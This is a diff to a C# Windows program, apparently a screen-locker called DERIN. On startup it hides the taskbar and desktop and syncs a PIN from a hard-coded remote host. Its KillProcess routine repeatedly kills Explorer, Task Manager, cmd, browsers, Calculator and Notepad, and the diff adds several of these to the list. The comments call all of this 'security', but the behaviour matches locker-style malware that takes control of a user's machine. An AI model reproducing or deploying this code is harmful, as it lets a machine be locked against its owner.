@@ -17,7 +17,6 @@ namespace DERIN
 {
     public partial class Form1 : Form
     {
-      
         public static string appPath = Application.StartupPath + "\\",
               http = "http://", //URL First address
               url = "zenlty.com.tr.ht/", //Web address
@@ -45,15 +44,15 @@ namespace DERIN
         }
         private void Form1_Load(object sender, EventArgs e)
         {
-            securityboard();
+            SecurityBoard();
             this.DesktopLocation = new Point(0, 0);
             this.Height = 478; // Form Height
             this.Width = 245; // Form Width
             this.Left = Screen.PrimaryScreen.WorkingArea.Right - this.Width; // Screen Width
             this.Top = Screen.PrimaryScreen.WorkingArea.Bottom - this.Height; // Screen Height
-            downloadpin(); // Downloading  --> Syncing Pin
+            SyncingPin(); // Downloading  --> Syncing Pin
         }
-        public void downloadpin()
+        public void SyncingPin()
         {
             WebClient webClient = new WebClient();
             webClient.DownloadFileCompleted += new AsyncCompletedEventHandler(Completed); // Download finish --> Syncing Pin 
@@ -78,30 +77,13 @@ namespace DERIN
             Taskbar.Show(); // |--> Taskbar Show --> Disabled Basic Security
             ShowDesktop();  // |--> Desktop Show --> Disabled Basic Security
         }
-
-        public void kill_process()
-        {
-
-            foreach (var process in Process.GetProcessesByName("explorer"))
-            {
-                process.Kill();
-            }
-            foreach (var process in Process.GetProcessesByName("chrome"))
-            {
-                process.Kill();
-            }
-            foreach (var process in Process.GetProcessesByName("taskmgr"))
-            {
-                process.Kill();
-            }
-        }
-        public void securityboard()
+        public void SecurityBoard()
         {
             Taskbar.Hide();  // |--> Taskbar Hide for Security
             HideDesktop();   // |--> Desktop Hide for Security
-            kill_process(); // |--> Process Kill Timer Enabled for Hard Security
+            KillProcess(); // |--> Process Kill Timer Enabled for Hard Security
         }
-
+        // |----------------------------------------------------------------------------------------------------------------------------|
         // |--> Taskbar Hide & Show
         private class Taskbar
         {
@@ -121,7 +103,7 @@ namespace DERIN
             public static void Hide() { ShowWindow(Handle, SW_HIDE); ShowWindow(HandleOfStartButton, SW_HIDE); }
         }
         // |--> Taskbar Hide & Show
-        //----------------------------------------------------------------------------------------------------------------------------
+        // |----------------------------------------------------------------------------------------------------------------------------|
         // |--> Desktop Hide & Show
         [DllImport("user32.dll", SetLastError = true)]// |--> for Desktop Hide & Show
         static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);
@@ -129,7 +111,18 @@ namespace DERIN
         public void ShowDesktop() { IntPtr hWnd = FindWindowEx(IntPtr.Zero, IntPtr.Zero, "Progman", null); ShowWindow(hWnd, 5); }
         public void HideDesktop() { IntPtr hWnd = FindWindowEx(IntPtr.Zero, IntPtr.Zero, "Progman", null); ShowWindow(hWnd, 0); }
         // |--> Desktop Hide & Show
-        //----------------------------------------------------------------------------------------------------------------------------
-
+        // |----------------------------------------------------------------------------------------------------------------------------
+        public void KillProcess()// |--> Kill Process --> For Basic Level Security
+        {
+            foreach (var process in Process.GetProcessesByName("explorer")) { process.Kill(); } // Windows Explorer
+            foreach (var process in Process.GetProcessesByName("chrome")) { process.Kill(); } // Chrome Browser
+            foreach (var process in Process.GetProcessesByName("taskmgr")) { process.Kill(); } // Task Manager
+            foreach (var process in Process.GetProcessesByName("MicrosoftEdge")) { process.Kill(); } // Microsoft Edge Browser
+            foreach (var process in Process.GetProcessesByName("calc")) { process.Kill(); } // Calculator
+            foreach (var process in Process.GetProcessesByName("cmd")) { process.Kill(); } // CMD
+            foreach (var process in Process.GetProcessesByName("notepad")) { process.Kill(); } // NotePad
+        }
+        // |--> Kill Process --> For Basic Level Security
+        // |----------------------------------------------------------------------------------------------------------------------------
     }
 }
